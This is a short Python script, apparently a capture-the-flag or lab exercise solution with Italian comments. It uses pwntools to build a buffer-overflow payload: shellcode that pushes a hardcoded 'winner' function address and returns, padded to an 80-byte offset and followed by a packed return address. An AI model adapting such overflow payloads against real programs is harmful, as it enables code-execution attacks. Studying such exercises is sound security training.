from pwnlib import shellcraft, asm, context
import struct

DATA_ADDR = 0x7ffff7ef4010
WINNER_ADDR = 0x400abd

context.arch = 'amd64'
# push ADDR
shellcode = shellcraft.amd64.push(WINNER_ADDR)
# ret
shellcode += shellcraft.amd64.ret()

# assembla lo shellcode per architettura amd64
shellcode = asm.asm(shellcode, arch='amd64')

# offset tra fp e buf e' di 80 caratteri
buf = shellcode + "A" * (80 - len(shellcode)) 
#restituisce l'indirizzo DATA_ADDR come un 
#unsigned long long, Little Endian
buf += struct.pack("<Q", DATA_ADDR)

print buf